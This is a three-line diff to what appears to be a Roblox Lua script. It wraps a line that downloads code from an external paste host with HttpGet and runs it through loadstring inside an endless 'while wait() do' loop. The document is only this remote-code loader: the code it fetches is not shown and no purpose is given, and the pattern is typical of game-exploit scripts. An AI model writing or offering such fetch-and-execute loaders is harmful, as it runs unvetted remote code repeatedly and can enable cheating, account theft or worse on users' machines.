@@ -1,1 +1,3 @@
+while wait() do
 loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
+end
